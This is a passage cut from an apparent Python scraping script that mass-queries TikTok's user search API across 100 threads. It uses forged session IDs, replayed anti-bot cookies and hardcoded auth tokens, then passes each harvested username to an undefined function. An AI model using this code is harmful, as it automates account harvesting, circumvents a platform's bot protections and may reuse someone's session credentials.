                    '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
                }

                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                    response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()
                except:
                    continue
                for users in response['user_list']:
                    
                        ud = (users['user_info']['uid'])
                        user=(users['user_info']['unique_id'])
                        req(user)
            except:''

for _ in range(100):
    thread = threading.Thread(target=hso1).start()
